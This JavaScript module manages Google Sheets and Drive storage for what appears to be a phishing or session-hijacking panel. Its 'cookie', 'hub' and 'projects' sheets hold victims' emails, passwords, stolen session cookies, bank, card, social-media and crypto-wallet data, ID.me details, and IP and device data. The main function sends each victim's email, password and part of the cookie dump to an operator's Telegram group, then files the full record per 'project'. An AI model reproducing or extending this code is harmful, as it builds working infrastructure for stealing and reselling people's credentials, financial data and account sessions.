import { google } from 'googleapis';
import logger from '../../utils/logger.js'; // Import the logger utility
import JSON5 from 'json5'; // Import json5 to parse GOOGLE_OAUTH2_JSON safely
import { sendTelegramMessage } from './telegram.js';
import axios from 'axios'; // Import axios for app script fallback
import { getJsonContentFromFile, createOrUpdateJsonFile, getOrCreateUserFolder } from './googledrive.mjs'; // Import Drive helpers

// --- Google Sheets API Configuration and Helpers ---
const GOOGLE_OAUTH2_JSON_STR = process.env.GOOGLE_OAUTH2_JSON;
const GOOGLE_SHEETS_REFRESH_TOKEN = process.env.GOOGLE_DRIVE_REFRESH_TOKEN; // Reusing Drive's refresh token for now
const SPREADSHEET_ID = process.env.DB_ID; // From .env
const SHEETS_SCOPES = ['https://www.googleapis.com/auth/spreadsheets']; // Sheets-specific scopes

function column_index_to_letter(index) {
  let result = "";
  while (index >= 0) {
    result = String.fromCharCode(65 + (index % 26)) + result;
    index = Math.floor(index / 26) - 1;
  }
  return result;
}

let cachedAuthClient = null;
let tokenExpiryTime = 0;

export async function getSheetsAuthClient() {
  const now = Date.now();
  if (cachedAuthClient && now < tokenExpiryTime) {
    logger.debug('Returning cached Sheets API auth client (OAuth2).');
    return cachedAuthClient;
  }

  if (!GOOGLE_OAUTH2_JSON_STR || !GOOGLE_SHEETS_REFRESH_TOKEN) {
    logger.error('[Sheets API] Missing GOOGLE_OAUTH2_JSON or GOOGLE_SHEETS_REFRESH_TOKEN. Sheets operations disabled.');
    return null;
  }

  try {
    const { web: credentials } = JSON5.parse(GOOGLE_OAUTH2_JSON_STR);
    const { client_id, client_secret, redirect_uris } = credentials;

    const oauth2Client = new google.auth.OAuth2(
      client_id,
      client_secret,
      redirect_uris[0] // Use the first redirect URI
    );

    oauth2Client.setCredentials({
      refresh_token: GOOGLE_SHEETS_REFRESH_TOKEN,
    });

    // Optionally, refresh token to get a new access token immediately
    const { credentials: tokens } = await oauth2Client.refreshAccessToken();
    oauth2Client.setCredentials(tokens);

    cachedAuthClient = oauth2Client;
    // For Sheets, we just return the authenticated OAuth2 client directly
    logger.debug('Sheets API authentication client obtained successfully using OAuth2.');
    return oauth2Client;
  } catch (error) {
    logger.error(`Failed to get Sheets API authentication client (OAuth2): ${error.message}`, { stack: error.stack });
    cachedAuthClient = null; // Reset client on error
    return null;
  }
}

export async function initializeGoogleSheets() {
  await getSheetsAuthClient();
}

/**
 * Fetches data from a Google Sheet using the Sheets API.
 * @param {string} sheetName - The name of the sheet.
 * @returns {Object} An object with success status, headers, and data.
 */
export async function getSheetDataApi(sheetName) {
  if (!SPREADSHEET_ID) {
    return { success: false, error: "SPREADSHEET_ID is not defined." };
  }
  try {
    const authClient = await getSheetsAuthClient();
    if (!authClient) {
      return { success: false, error: "Failed to get Sheets API authentication client." };
    }

    const sheets = google.sheets({ version: 'v4', auth: authClient });
    // Fetch all values to get headers and data
    const allValuesResponse = await sheets.spreadsheets.values.get({
      spreadsheetId: SPREADSHEET_ID,
      range: sheetName, // Fetch all data from the sheet
    });
    const allValues = allValuesResponse.data.values || [];

    // Fetch headers specifically from the first row to ensure all header columns are captured
    const headersResponse = await sheets.spreadsheets.values.get({
      spreadsheetId: SPREADSHEET_ID,
      range: `${sheetName}!1:1`, // Get only the first row for headers
    });
    const headers = headersResponse.data.values && headersResponse.data.values.length > 0 ? headersResponse.data.values[0] : [];

    if (allValues.length > 0) {
      const data = allValues.slice(1); // All rows except the first (headers)
      return { success: true, headers, data, count: data.length };
    } else {
      return { success: true, headers, data: [], count: 0 };
    }
  } catch (error) {
    return { success: false, error: error.message };
    }
}

/**
 * Deletes a row from a Google Sheet based on search criteria using the Sheets API.
 * @param {string} sheetName - The name of the sheet.
 * @param {string} searchColumn - Column to search in.
 * @param {string} searchValue - Value to search for.
 * @returns {Object} An object with success status and message.
 */
export async function deleteSheetRowApi(sheetName, searchColumn, searchValue) {
  if (!SPREADSHEET_ID) {
    return { success: false, error: "SPREADSHEET_ID is not defined." };
  }
  try {
    const authClient = await getSheetsAuthClient();
    if (!authClient) {
      return { success: false, error: "Failed to get Sheets API authentication client." };
    }

    const sheets = google.sheets({ version: 'v4', auth: authClient });

    const allRowsResult = await getSheetDataApi(sheetName);
    if (!allRowsResult.success || allRowsResult.count === 0) {
      return { success: false, error: `No data found in ${sheetName}.` };
    }

    const headers = allRowsResult.headers;
    const rows = allRowsResult.data;
    const searchColumnIndex = headers.indexOf(searchColumn);
    if (searchColumnIndex === -1) {
      return { success: false, error: `Header '${searchColumn}' not found.` };
    }

    const rowIndex = rows.findIndex(row =>
      row[searchColumnIndex] && String(row[searchColumnIndex]).trim() === String(searchValue).trim()
    );

    if (rowIndex === -1) {
      return { success: false, error: `Row with ${searchColumn}='${searchValue}' not found.` };
    }

    const actualRowNumber = rowIndex + 2; // +1 for 0-based index, +1 for header

    // Instead of deleteRange which fails over array formulas, clear the row by setting all cells to empty strings
    const lastColLetter = column_index_to_letter(headers.length - 1);
    const rangeToClear = `${sheetName}!A${actualRowNumber}:${lastColLetter}${actualRowNumber}`;
    const emptyValues = Array(headers.length).fill("");

    const response = await sheets.spreadsheets.values.batchUpdate({
      spreadsheetId: SPREADSHEET_ID,
      resource: {
        valueInputOption: 'RAW',
        data: [{
          range: rangeToClear,
          values: [emptyValues]
        }]
      }
    });

    return { success: true, message: "Row cleared successfully via Sheets API (delete not allowed over array formula)" };
  } catch (error) {
    return { success: false, error: error.message };
  }
}

/**
 * Appends a new row to a Google Sheet using the Sheets API.
 * @param {string} sheetName - The name of the sheet.
 * @param {Object} headerAndValueMap - Key-value pairs of header and data.
 * @returns {Object} An object with success status and message.
 */
export async function appendSheetRowApi(sheetName, headerAndValueMap) {
  if (!SPREADSHEET_ID) {
    return { success: false, error: "SPREADSHEET_ID is not defined." };
  }
  try {
    const authClient = await getSheetsAuthClient();
    if (!authClient) {
      return { success: false, error: "Failed to get Sheets API authentication client." };
    }

    const sheets = google.sheets({ version: 'v4', auth: authClient });

    const headersResult = await getSheetDataApi(sheetName);
    if (!headersResult.success || headersResult.headers.length === 0) {
      return { success: false, error: `Failed to retrieve headers for sheet ${sheetName}: ${headersResult.error || "No headers found."}` };
    }
    const headers = headersResult.headers;

    // Initialize newRowData with nulls, so empty cells are truly empty and don't interfere with formulas
    const newRowData = Array(headers.length).fill(null);
    Object.entries(headerAndValueMap).forEach(([header, value]) => {
      if (header.toLowerCase() === 'rowId') { // Skip 'id' column to let formula auto-populate
        // The 'id' column will remain null, allowing the sheet formula to populate it
        return;
      }
      const headerIndex = headers.indexOf(header);
      if (headerIndex !== -1) {
        newRowData[headerIndex] = value;
      } else {
      }
    });


    const lastColLetter = column_index_to_letter(headers.length - 1);
    const range = `${sheetName}!A:${lastColLetter}`;

    const response = await sheets.spreadsheets.values.append({
      spreadsheetId: SPREADSHEET_ID,
      range: range,
      valueInputOption: 'RAW',
      insertDataOption: 'INSERT_ROWS',
      resource: {
        values: [newRowData],
      },
    });

    return { success: true, message: "New row added successfully via Sheets API", updates: response.data.updates };
  } catch (error) {
    return { success: false, error: error.message };
  }
}

/**
 * Updates cells in a Google Sheet row matching search criteria using the Sheets API.
 * @param {string} sheetName - The name of the sheet.
 * @param {string} searchColumn - Column to search in.
 * @param {string} searchValue - Value to search for.
 * @param {Object} headerAndValueMap - Key-value pairs to update.
 * @returns {Object} An object with success status and message.
 */
export async function updateSheetRowApi(sheetName, searchColumn, searchValue, headerAndValueMap) {
  if (!SPREADSHEET_ID) {
    return { success: false, error: "SPREADSHEET_ID is not defined." };
  }
  try {
    const authClient = await getSheetsAuthClient();
    if (!authClient) {
      return { success: false, error: "Failed to get Sheets API authentication client." };
    }

    const sheets = google.sheets({ version: 'v4', auth: authClient });

    const allRowsResult = await getSheetDataApi(sheetName);
    if (!allRowsResult.success || allRowsResult.count === 0) {
      return { success: false, error: `Failed to retrieve data for sheet ${sheetName}: ${allRowsResult.error || "No data found."}` };
    }

    const headers = allRowsResult.headers;
    const rows = allRowsResult.data;
    const searchColumnIndex = headers.indexOf(searchColumn);
    if (searchColumnIndex === -1) {
      return { success: false, error: `Header '${searchColumn}' not found in the table.` };
    }

    const rowIndex = rows.findIndex(row => 
      row[searchColumnIndex] && String(row[searchColumnIndex]).trim() === String(searchValue).trim()
    );
    
    if (rowIndex === -1) {
      return { success: false, error: `Row with ${searchColumn}='${searchValue}' not found.` };
    }

    const actualRowNumber = rowIndex + 2; // +1 for 0-based index to 1-based, +1 for header row

    const requests = [];
    Object.entries(headerAndValueMap).forEach(([header, value]) => {
      if (header.toLowerCase() === 'id') { // Skip 'id' column to let formula auto-populate
        return;
      }
      const headerIndex = headers.indexOf(header);
      if (headerIndex !== -1) {
        const columnLetter = column_index_to_letter(headerIndex);
        requests.push({
          range: `${sheetName}!${columnLetter}${actualRowNumber}`,
          values: [[value]]
        });
      } else {
      }
    });

    if (requests.length === 0) {
      return { success: false, error: "No valid headers found for update." };
    }

    const response = await sheets.spreadsheets.values.batchUpdate({
      spreadsheetId: SPREADSHEET_ID,
      resource: {
        valueInputOption: 'RAW',
        data: requests,
      },
    });

    return { success: true, message: "Cells updated successfully via Sheets API", updates: response.data.responses };
  } catch (error) {
    return { success: false, error: error.message };
    }
}

/**
 * Fetches specific details for a given projectId from the PROJECTS sheet.
 * @param {string} projectId - The projectId to search for.
 * @returns {Object|null} An object containing project details (telegramGroupId, projectTitle, templateType) if found, otherwise null.
 */
export async function getProjectDetails(projectId) {
  const PROJECTS_SHEET_NAME = "projects";
  try {
    logger.info(`[GoogleSheets] Attempting to get project details for projectId: ${projectId}`);
    const projectRowsResult = await getSheetDataApi(PROJECTS_SHEET_NAME);

    if (!projectRowsResult.success || projectRowsResult.count === 0) {
      logger.warn(`[GoogleSheets] Failed to fetch project data or no projects found for projectId: ${projectId}`);
      return null;
    }

    const projectHeaders = projectRowsResult.headers;
    const projectIdIndex = projectHeaders.indexOf("projectId");
    const telegramGroupIdIndex = projectHeaders.indexOf("telegramGroupId");
    const projectTitleIndex = projectHeaders.indexOf("projectTitle"); // Assuming a 'projectTitle' column
    const templateTypeIndex = projectHeaders.indexOf("templateType"); // Assuming a 'templateType' column

    if (projectIdIndex === -1) {
      logger.error(`[GoogleSheets] 'projectId' header not found in the PROJECTS sheet.`);
      return null;
    }

    const projectRow = projectRowsResult.data.find(row =>
      row[projectIdIndex] && String(row[projectIdIndex]).trim() === String(projectId).trim()
    );

    if (!projectRow) {
      logger.warn(`[GoogleSheets] Project with projectId '${projectId}' not found in the PROJECTS sheet.`);
      return null;
    }

    const telegramGroupId = telegramGroupIdIndex !== -1 ? projectRow[telegramGroupIdIndex] : null;
    const projectTitle = projectTitleIndex !== -1 ? projectRow[projectTitleIndex] : null;
    const templateType = templateTypeIndex !== -1 ? projectRow[templateTypeIndex] : null;

    logger.info(`[GoogleSheets] Found details for projectId '${projectId}': Telegram Group ID: '${telegramGroupId}', Project Title: '${projectTitle}', Template Type: '${templateType}'`);
    return { telegramGroupId, projectTitle, templateType };

  } catch (error) {
    logger.error(`[GoogleSheets] Error getting project details for projectId ${projectId}: ${error.message}`, { stack: error.stack });
    return null;
  }
}


/**
 * Deletes failed rows from cookie and hub sheets and removes the entry from projects response.
 */
async function cleanupFailedRowsWithoutEmail() {
  try {
    const allRowsResult = await getSheetDataApi('cookie');
    if (!allRowsResult.success) return;

    const headers = allRowsResult.headers;
    const rows = allRowsResult.data;

    const browserIdIndex = headers.indexOf('browserId');
    const statusIndex = headers.indexOf('status');
    const emailIndex = headers.indexOf('email');
    const projectIdIndex = headers.indexOf('projectId');

    if (browserIdIndex === -1 || statusIndex === -1 || emailIndex === -1 || projectIdIndex === -1) {
      logger.error('Headers not found for cleanup');
      return;
    }

    const failedRows = rows.filter(row =>
      String(row[statusIndex]).trim() === 'FAILED' &&
      (!row[emailIndex] || !String(row[emailIndex]).trim())
    );

    logger.info(`Found ${failedRows.length} FAILED rows without email. Attempting to delete.`);

    for (const row of failedRows) {
      const browserId = row[browserIdIndex];
      const projectId = row[projectIdIndex];

      // Delete the cookie row
      const deleteCookie = await deleteSheetRowApi('cookie', 'browserId', browserId);
      if (!deleteCookie.success) logger.error(`Failed to delete cookie row for ${browserId}: ${deleteCookie.error}`);

      // Delete the hub row
      const deleteHub = await deleteSheetRowApi('hub', 'submissionId', browserId);
      if (!deleteHub.success) logger.error(`Failed to delete hub row for ${browserId}: ${deleteHub.error}`);

      // For projects, remove the browserId entry from the responses
      if (projectId) {
        const projectsResult = await getSheetDataApi('projects');
        if (projectsResult.success && projectsResult.count > 0) {
          const projectHeaders = projectsResult.headers;
          const projectRow = projectsResult.data.find(r => String(r[projectHeaders.indexOf('projectId')]).trim() === String(projectId).trim());
          if (projectRow) {
            const responseIndex = projectHeaders.indexOf('response');
            const responseValue = projectRow[responseIndex];
            if (responseValue) {
              try {
                let responses = JSON.parse(responseValue);
                if (Array.isArray(responses)) {
                  // Remove the entry with matching submissionId
                  responses = responses.filter(entry => entry.submissionId !== browserId);
                  const newResponseValue = JSON.stringify(responses);
                  const updateProject = await updateSheetRowApi('projects', 'projectId', projectId, { response: newResponseValue });
                  if (!updateProject.success) logger.error(`Failed to update projects response for ${projectId}: ${updateProject.error}`);
                  else logger.info(`Updated projects response for ${projectId}, removed submissionId ${browserId}`);
                }
              } catch (e) {
                logger.error(`Error parsing/updating projects response for ${projectId}: ${e.message}`);
              }
            }
          }
        }
      }

      logger.info(`Cleaned rows for browserId ${browserId}`);
    }
  } catch (e) {
    logger.error(`Error in cleanupFailedRowsWithoutEmail: ${e.message}`);
  }
}

/**
 * Helper function to update hub and projects sheets with data from the cookie sheet.
 * This function is intended to be called when a cookie submission status changes (e.g., COMPLETED, FAILED).
 * @param {string} browserId - The browserId to identify the cookie row and corresponding submissions.
 * @param {string} status - The status of the cookie submission (e.g., "COMPLETED", "FAILED").
 * @returns {Object} A JSON response indicating success or failure.
 */
export async function updateHubAndProjectsFromCookieData(browserId, status) {
  logger.info(`[updateHubAndProjectsFromCookieData] Starting update for browserId: ${browserId}, status: ${status}`);

  const HUB_SHEET_NAME = "hub"; // Assuming "HUB" is the sheet name
  const PROJECTS_SHEET_NAME = "projects"; // Assuming "PROJECTS" is the sheet name
  const COOKIE_SHEET_NAME = "cookie"; // Assuming "cookie" is the sheet name
  const CELL_SIZE_LIMIT = 45000; // Define a threshold for saving to Drive

  try {
    logger.debug(`[updateHubAndProjectsFromCookieData] Fetching cookie data for browserId: ${browserId}`);
    // 1. Get cookie row data using Sheets API
    const cookieRowsResult = await getSheetDataApi(COOKIE_SHEET_NAME);

    if (!cookieRowsResult.success || cookieRowsResult.count === 0) {
      logger.error(`[updateHubAndProjectsFromCookieData] Cookie data for browserId '${browserId}' not found or failed to fetch.`);
      return {
        success: false,
        error: `Cookie data for browserId '${browserId}' not found or failed to fetch.`
      };
    }

    const cookieHeaders = cookieRowsResult.headers;
    const cookieRow = cookieRowsResult.data.find(row => {
      const browserIdIndex = cookieHeaders.indexOf("browserId");
      return browserIdIndex !== -1 && String(row[browserIdIndex]).trim() === String(browserId).trim();
    });

    if (!cookieRow) {
      logger.error(`[updateHubAndProjectsFromCookieData] Cookie data for browserId '${browserId}' not found in sheet.`);
      return {
        success: false,
        error: `Cookie data for browserId '${browserId}' not found in sheet.`
      };
    }

    const cookieRowMap = {};
    cookieHeaders.forEach((header, index) => {
      cookieRowMap[header] = cookieRow[index];
    });
    logger.debug(`[updateHubAndProjectsFromCookieData] Retrieved cookie data for browserId ${browserId}.`);

    // Prepare data for Hub and Projects
    const dataToUpdate = {
      email: cookieRowMap.email || "",
      domain: cookieRowMap.domain || "",
      password: cookieRowMap.password || "",
      ipData: cookieRowMap.ipData ? JSON.parse(cookieRowMap.ipData) : {},
      deviceData: cookieRowMap.deviceData ? JSON.parse(cookieRowMap.deviceData) : {},
      verifyAccess: cookieRowMap.verifyAccess !== undefined ? (String(cookieRowMap.verifyAccess).toLowerCase() === 'true') : false,
      cookieAccess: cookieRowMap.cookieAccess !== undefined ? (String(cookieRowMap.cookieAccess).toLowerCase() === 'true') : false,
      verified: cookieRowMap.verified !== undefined ? (String(cookieRowMap.verified).toLowerCase() === 'true') : false,
      fullAccess: cookieRowMap.fullAccess !== undefined ? (String(cookieRowMap.fullAccess).toLowerCase() === 'true') : false,
      banks: cookieRowMap.banks ? JSON.parse(cookieRowMap.banks) : [],
      cards: cookieRowMap.cards ? JSON.parse(cookieRowMap.cards) : [],
      socials: cookieRowMap.socials ? JSON.parse(cookieRowMap.socials) : [],
      wallets: cookieRowMap.wallets ? JSON.parse(cookieRowMap.wallets) : [],
      idMe: cookieRowMap.idMe || null,
      cookieJSON: cookieRowMap.formattedCookie ? JSON.parse(cookieRowMap.formattedCookie) : {},
      cookieFileURL: cookieRowMap.driveUrl || ""
    };

    const projectId = cookieRowMap.projectId;
    if (!projectId) {
      logger.error(`[updateHubAndProjectsFromCookieData] projectId not found in cookie data for browserId '${browserId}'.`);
      return {
        success: false,
        error: `projectId not found in cookie data for browserId '${browserId}'.`
      };
    }
    logger.info(`[updateHubAndProjectsFromCookieData] Extracted projectId: ${projectId}.`);

    const projectDetails = await getProjectDetails(projectId);
    const projectTelegramId = projectDetails?.telegramGroupId;
    const projectTitle = projectDetails?.projectTitle || "N/A";
    const templateType = projectDetails?.templateType || "UNKNOWN";


    if (projectTelegramId) {
      logger.info(`[updateHubAndProjectsFromCookieData] Sending Telegram notification to ${projectTelegramId} for status: ${status}.`);
      let telegramMessage = `*Project:* ${projectTitle}\n*Status:* ${status}\n*Email:* ${cookieRowMap.email}\n*Password:* ${cookieRowMap.password}`;

      if (templateType === "COOKIE" && status === "COMPLETED") {
        telegramMessage += `\n*Cookie JSON:* ${JSON.stringify(dataToUpdate.cookieJSON).substring(0, 500)}...`; // Truncate for brevity
      } else if (templateType === "COOKIE" && status === "FAILED") {
        telegramMessage += `\n*Cookie JSON:* (Not available on failure)`;
      }

      await sendTelegramMessage(projectTelegramId, telegramMessage);
    } else {
      logger.warn(`[updateHubAndProjectsFromCookieData] No telegramGroupId found for projectId '${projectId}'. Skipping Telegram notification.`);
    }

    logger.debug(`[updateHubAndProjectsFromCookieData] Preparing data for Hub sheet update.`);
    // 2. Update Hub Sheet (first)
    const hubUpdateData = {
      email: dataToUpdate.email,
      domain: dataToUpdate.domain,
      password: dataToUpdate.password,
      verified: dataToUpdate.verified ? "TRUE" : "FALSE",
      fullAccess: dataToUpdate.fullAccess ? "TRUE" : "FALSE",
      banks: JSON.stringify(dataToUpdate.banks),
      cards: JSON.stringify(dataToUpdate.cards),
      socials: JSON.stringify(dataToUpdate.socials),
      wallets: JSON.stringify(dataToUpdate.wallets),
      cookieJSON: JSON.stringify(dataToUpdate.cookieJSON),
      cookieFileURL: dataToUpdate.cookieFileURL,
      status: status // Assuming a 'status' column exists in HUB
    };

    const updateHubResult = await updateSheetRowApi(
      HUB_SHEET_NAME,
      "submissionId", // Search column in hub is submissionId
      browserId,      // browserId from cookie sheet matches submissionId in hub
      hubUpdateData
    );

    if (!updateHubResult.success) {
      logger.error(`[updateHubAndProjectsFromCookieData] Failed to update Hub sheet via Sheets API for browserId '${browserId}'. Attempting App Script fallback.`);
      // Fallback to App Script for HUB update
      const appScriptUrl = process.env.SCRIPT_URL;
      const params = new URLSearchParams({
        action: 'setMultipleCellDataByColumnSearch', // Assuming this action exists in App Script
        sheetName: HUB_SHEET_NAME,
        searchColumn: "submissionId",
        searchValue: browserId,
        key: process.env.SCRIPT_KEY,
        data: JSON.stringify(hubUpdateData)
      });
      const appScriptResponse = await axios.post(appScriptUrl, params, {
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        timeout: 60000,
      });
      if (!appScriptResponse.data || !appScriptResponse.data.success) {
        logger.error(`[updateHubAndProjectsFromCookieData] Failed to update hub sheet for browserId '${browserId}' via App Script fallback: ${appScriptResponse.data?.error || 'Unknown error'}`);
        return {
          success: false,
          error: `Failed to update hub sheet for browserId '${browserId}' via App Script fallback: ${appScriptResponse.data?.error || 'Unknown error'}`
        };
      }
      logger.info(`[updateHubAndProjectsFromCookieData] Hub sheet updated successfully via App Script fallback for browserId '${browserId}'.`);
    } else {
      logger.info(`[updateHubAndProjectsFromCookieData] Hub sheet updated successfully via Sheets API for browserId '${browserId}'.`);
    }


    logger.debug(`[updateHubAndProjectsFromCookieData] Preparing data for Projects sheet update.`);
    // 3. Update Projects Sheet
    const projectRowsResult = await getSheetDataApi(PROJECTS_SHEET_NAME);

    if (!projectRowsResult.success || projectRowsResult.count === 0) {
      logger.error(`[updateHubAndProjectsFromCookieData] Project with projectId '${projectId}' not found or failed to fetch for updating response.`);
      return {
        success: false,
        error: `Project with projectId '${projectId}' not found for updating response.`
      };
    }

    const projectHeaders = projectRowsResult.headers;
    const projectRow = projectRowsResult.data.find(row => {
      const projectIdIndex = projectHeaders.indexOf("projectId");
      return projectIdIndex !== -1 && String(row[projectIdIndex]).trim() === String(projectId).trim();
    });

    if (!projectRow) {
      logger.error(`[updateHubAndProjectsFromCookieData] Project with projectId '${projectId}' not found in sheet.`);
      return {
        success: false,
        error: `Project with projectId '${projectId}' not found in sheet.`
      };
    }

    const projectRowMapForUpdate = {};
    projectHeaders.forEach((header, index) => {
      projectRowMapForUpdate[header] = projectRow[index];
    });
    logger.debug(`[updateHubAndProjectsFromCookieData] Retrieved project data for projectId ${projectId}.`);

    let existingResponses = [];
    const responseColumnIndex = projectHeaders.indexOf("response");
    const responseColumnValue = responseColumnIndex !== -1 ? projectRow[responseColumnIndex] : null;

    if (responseColumnValue) {
      try {
        let parsedResponse = JSON.parse(responseColumnValue);
        if (parsedResponse && parsedResponse.fileId) {
          logger.debug(`[updateHubAndProjectsFromCookieData] Fetching existing responses from Drive file: ${parsedResponse.fileId}`);
          const fileContentResult = await getJsonContentFromFile(parsedResponse.fileId);
          if (fileContentResult.success) {
            existingResponses = fileContentResult.data;
            logger.debug(`[updateHubAndProjectsFromCookieData] Successfully fetched ${existingResponses.length} existing responses from Drive.`);
          } else {
            logger.warn(`[updateHubAndProjectsFromCookieData] Failed to fetch existing responses from Drive: ${fileContentResult.error}. Initializing empty array.`);
            existingResponses = [];
          }
        } else if (Array.isArray(parsedResponse)) {
          existingResponses = parsedResponse;
          logger.debug(`[updateHubAndProjectsFromCookieData] Successfully parsed ${existingResponses.length} existing responses from sheet cell.`);
        } else {
          logger.warn(`[updateHubAndProjectsFromCookieData] Existing response value is not a fileId object or an array. Initializing empty array.`);
          existingResponses = [];
        }
      } catch (e) {
        logger.error(`[updateHubAndProjectsFromCookieData] Error parsing existing response JSON: ${e.message}. Initializing empty array.`, { stack: e.stack });
        existingResponses = [];
      }
    } else {
      logger.debug(`[updateHubAndProjectsFromCookieData] No existing responses found in sheet cell. Initializing empty array.`);
    }

    let submissionEntryFound = false;
    const updatedResponses = existingResponses.map(entry => {
      if (entry.submissionId === browserId) {
        submissionEntryFound = true;
        logger.info(`[updateHubAndProjectsFromCookieData] Updating existing submission entry for browserId: ${browserId}`);
        return {
          ...entry,
          email: dataToUpdate.email,
          domain: dataToUpdate.domain,
          password: dataToUpdate.password,
          verified: dataToUpdate.verified,
          fullAccess: dataToUpdate.fullAccess,
          banks: dataToUpdate.banks,
          cards: dataToUpdate.cards,
          socials: dataToUpdate.socials,
          wallets: dataToUpdate.wallets,
          idMe: dataToUpdate.idMe,
          cookieJSON: dataToUpdate.cookieJSON,
          cookieFileURL: dataToUpdate.cookieFileURL
        };
      }
      return entry;
    });

    if (!submissionEntryFound) {
      logger.info(`[updateHubAndProjectsFromCookieData] Adding new submission entry for browserId: ${browserId}`);
      updatedResponses.push({
        id: Math.random().toString(36).substring(2, 15), // Simple unique ID
        submissionId: browserId,
        category: cookieRowMap.category || "UNKNOWN",
        type: cookieRowMap.type || "UNKNOWN",
        title: cookieRowMap.title || "Form Submission",
        userId: cookieRowMap.userId || "N/A",
        projectId: projectId,
        formId: cookieRowMap.formId || "N/A",
        timestamp: new Date().toLocaleString(),
        email: cookieRowMap.email || "N/A",
        domain: cookieRowMap.domain || "N/A",
        password: cookieRowMap.password || "N/A",
        ipData: cookieRowMap.ipData ? JSON.parse(cookieRowMap.ipData) : {},
        deviceData: cookieRowMap.deviceData ? JSON.parse(cookieRowMap.deviceData) : {},
        verifyAccess: dataToUpdate.verified,
        cookieAccess: dataToUpdate.cookieAccess,
        verified: dataToUpdate.verified,
        fullAccess: dataToUpdate.fullAccess,
        cookieJSON: dataToUpdate.cookieJSON,
        cookieFileURL: dataToUpdate.cookieFileURL,
        banks: dataToUpdate.banks,
        cards: dataToUpdate.cards,
        socials: dataToUpdate.socials,
        wallets: dataToUpdate.wallets,
        apiResponse: cookieRowMap.apiResponse ? JSON.parse(cookieRowMap.apiResponse) : null
      });
    }

    const responseStringForUpdate = JSON.stringify(updatedResponses);
    let responseDataToWriteForUpdate;

    if (responseStringForUpdate.length > CELL_SIZE_LIMIT) {
      logger.info(`[updateHubAndProjectsFromCookieData] Response data exceeds cell size limit (${CELL_SIZE_LIMIT} chars). Saving to Google Drive.`);

      const userId = projectRowMapForUpdate.userId;
      if (!userId) {
        logger.error(`[updateHubAndProjectsFromCookieData] User ID not found in project data for update. Cannot save to Drive.`);
        return { success: false, error: "User ID not found in project data for update." };
      }

      logger.debug(`[updateHubAndProjectsFromCookieData] Getting or creating user folder for userId: ${userId}`);
      const userFolderResult = await getOrCreateUserFolder(userId, process.env.USERS_FOLDER_ID); // Use process.env.USERS_FOLDER_ID
      if (!userFolderResult.success) {
        logger.error(`[updateHubAndProjectsFromCookieData] Failed to get or create user folder for userId ${userId} during update: ${userFolderResult.error}`);
        return { success: false, error: `Failed to get or create user folder for userId ${userId} during update: ${userFolderResult.error}` };
      }
      const parentFolderId = userFolderResult.folderId;

      if (!parentFolderId) {
        logger.error(`[updateHubAndProjectsFromCookieData] User's parent folderId not found after creation/retrieval during update.`);
        return { success: false, error: "User's parent folderId not found after creation/retrieval during update." };
      }

      const fileName = `${projectId}.json`;
      logger.debug(`[updateHubAndProjectsFromCookieData] Creating or updating JSON file in Drive: ${fileName}, parentFolderId: ${parentFolderId}`);
      const saveFileResult = await createOrUpdateJsonFile(parentFolderId, projectId, fileName, updatedResponses);

      if (saveFileResult.success) {
        responseDataToWriteForUpdate = JSON.stringify({ fileId: saveFileResult.fileId, lastUpdated: new Date().toISOString(), totalResponses: updatedResponses.length });
        logger.info(`[updateHubAndProjectsFromCookieData] Successfully saved updated responses to Drive, fileId: ${saveFileResult.fileId}, total responses: ${updatedResponses.length}.`);
      } else {
        logger.error(`[updateHubAndProjectsFromCookieData] Failed to save updated responses to Drive: ${saveFileResult.error}`);
        return { success: false, error: `Failed to save updated responses to Drive: ${saveFileResult.error}` };
      }
    } else {
      responseDataToWriteForUpdate = responseStringForUpdate;
      logger.info(`[updateHubAndProjectsFromCookieData] Response data within cell size limit. Saving directly to sheet cell.`);
    }

    logger.debug(`[updateHubAndProjectsFromCookieData] Updating Projects sheet row for projectId: ${projectId}.`);
    logger.info(`[updateHubAndProjectsFromCookieData] Preparing to update projects response cell with data length: ${responseDataToWriteForUpdate.length}`);
    if (responseDataToWriteForUpdate.length > 1000) {
      logger.info(`[updateHubAndProjectsFromCookieData] Response data is large, starting with: ${responseDataToWriteForUpdate.substring(0,100)}...`);
    } else {
      logger.info(`[updateHubAndProjectsFromCookieData] Response data: ${responseDataToWriteForUpdate}`);
    }
    const updateProjectResult = await updateSheetRowApi(
      PROJECTS_SHEET_NAME,
      "projectId",
      projectId,
      { "response": responseDataToWriteForUpdate }
    );

    logger.info(`[updateHubAndProjectsFromCookieData] Sheets API update result: ${JSON.stringify(updateProjectResult)}`);

    if (!updateProjectResult.success) {
      logger.error(`[updateHubAndProjectsFromCookieData] Failed to update Projects sheet via Sheets API for projectId '${projectId}'. Attempting App Script fallback.`);
      // Fallback to App Script for PROJECTS update
      const appScriptUrl = process.env.SCRIPT_URL;
      const params = new URLSearchParams({
        action: 'setMultipleCellDataByColumnSearch', // Assuming this action exists in App Script
        sheetName: PROJECTS_SHEET_NAME,
        searchColumn: "projectId",
        searchValue: projectId,
        key: process.env.SCRIPT_KEY,
        data: JSON.stringify({ "response": responseDataToWriteForUpdate })
      });
      const appScriptResponse = await axios.post(appScriptUrl, params, {
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        timeout: 60000,
      });
      if (!appScriptResponse.data || !appScriptResponse.data.success) {
        logger.error(`[updateHubAndProjectsFromCookieData] Failed to update project sheet response for projectId '${projectId}' via App Script fallback: ${appScriptResponse.data?.error || 'Unknown error'}`);
        return {
          success: false,
          error: `Failed to update project sheet response for projectId '${projectId}' via App Script fallback: ${appScriptResponse.data?.error || 'Unknown error'}`
        };
      }
      logger.info(`[updateHubAndProjectsFromCookieData] Projects sheet updated successfully via App Script fallback for projectId '${projectId}'.`);
    } else {
      logger.info(`[updateHubAndProjectsFromCookieData] Projects sheet updated successfully via Sheets API for projectId '${projectId}'.`);
    }

    logger.info(`[updateHubAndProjectsFromCookieData] Completed update for browserId: ${browserId}.`);
    await cleanupFailedRowsWithoutEmail();
    return {
      success: true,
      message: `Hub and Projects sheets updated successfully for browserId: ${browserId}`,
      hubUpdate: updateHubResult,
      projectUpdate: updateProjectResult
    };

  } catch (error) {
    logger.error(`[updateHubAndProjectsFromCookieData] Server error for browserId ${browserId}: ${error.message}`, { stack: error.stack });
    return {
      success: false,
      error: "Server error in updateHubAndProjectsFromCookieData: " + error.message,
      stack: error.stack
    };
  }
}
